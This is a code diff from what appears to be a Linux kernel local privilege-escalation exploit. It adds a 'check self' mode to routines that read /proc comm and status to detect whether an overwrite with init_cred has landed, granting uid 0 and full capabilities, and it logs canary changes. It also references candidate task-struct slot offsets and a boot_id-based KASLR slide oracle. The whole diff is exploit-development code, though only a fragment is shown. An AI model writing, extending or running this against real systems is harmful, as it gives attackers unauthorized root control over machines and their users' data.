@@ -41,6 +41,7 @@ const uint64_t g_uid0_slot_candidates[] = {0x900, 0x8F8, 0x780, 0x778,
 const int g_uid0_slot_ncand = 6;
 int g_uid0_slot_idx;
 uintptr_t g_uid0_task_base;
+int g_uid0_check_self;
 char g_bootid_before[80];
 
 /* Landing signal for the SLIDE oracle: boot_id changes iff the
@@ -66,10 +67,12 @@ volatile int g_uid0_cred_landed;
  * the SUBJECTIVE cred — a landed init_cred store flips it from all-zero to
  * full caps even while the child pipe is wedged. */
 int uid0_child_comm_landed(void) {
-  if (g_uid0_child_pid <= 0)
+  /* self punches (who=self_x28_p0) must be checked on SELF, not the child */
+  long pid = g_uid0_check_self ? (long)getpid() : g_uid0_child_pid;
+  if (pid <= 0)
     return 0;
   char path[64];
-  snprintf(path, sizeof(path), "/proc/%ld/comm", g_uid0_child_pid);
+  snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
   int fd = open(path, O_RDONLY);
   if (fd < 0)
     return 0;
@@ -82,14 +85,21 @@ int uid0_child_comm_landed(void) {
   for (ssize_t i = 0; i < n; i++)
     if (buf[i] == '\n')
       buf[i] = 0;
-  return strcmp(buf, "gl_uid0_child") != 0;
+  int diff = strcmp(buf, "gl_uid0_child") != 0;
+  if (diff) {
+    char lb[96];
+    snprintf(lb, sizeof(lb), "canary comm now=[%.24s] (landed=%d)", buf, diff);
+    live_sync_log("UID0", lb);
+  }
+  return diff;
 }
 
 int uid0_child_status_landed(void) {
-  if (g_uid0_child_pid <= 0)
+  long pid = g_uid0_check_self ? (long)getpid() : g_uid0_child_pid;
+  if (pid <= 0)
     return 0;
   char path[64];
-  snprintf(path, sizeof(path), "/proc/%ld/status", g_uid0_child_pid);
+  snprintf(path, sizeof(path), "/proc/%ld/status", pid);
   int fd = open(path, O_RDONLY);
   if (fd < 0)
     return 0;
@@ -112,10 +122,11 @@ int uid0_child_status_landed(void) {
 }
 
 int uid0_child_capeff_landed(void) {
-  if (g_uid0_child_pid <= 0)
+  long pid = g_uid0_check_self ? (long)getpid() : g_uid0_child_pid;
+  if (pid <= 0)
     return 0;
   char path[64];
-  snprintf(path, sizeof(path), "/proc/%ld/status", g_uid0_child_pid);
+  snprintf(path, sizeof(path), "/proc/%ld/status", pid);
   int fd = open(path, O_RDONLY);
   if (fd < 0)
     return 0;
